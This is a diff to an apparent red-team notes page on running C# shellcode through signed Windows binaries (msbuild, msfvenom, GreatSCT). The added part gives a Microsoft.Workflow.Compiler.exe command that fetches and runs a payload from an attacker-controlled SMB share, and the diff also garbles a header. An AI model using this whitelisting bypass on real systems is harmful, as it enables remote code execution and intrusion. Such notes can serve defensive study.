@@ -1,4 +1,4 @@
-## Execute C\#
+## Execute C\
 
 ### msbuild.exe
 
@@ -77,7 +77,23 @@ Note2: Use metasploit to generate C\# shellcode with the follow command: “msfv
 
 [GreatSCT](https://github.com/ConsciousHacker/GreatSCT)--tool to automatically generate the xml file.
 
+
+
+### Microsoft.Workflow.Compiler.exe
+
+Another method to execute C\# shellcode
+
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe \\attacker\Public\payload.txt /out:-
+```
+
+Fetching payload from an SMB Share \(attacker\)
+
+
+
 References:
+
+https://www.forcepoint.com/blog/security-labs/using-c-post-powershell-attacks/
 
 [https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/](https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/)
 
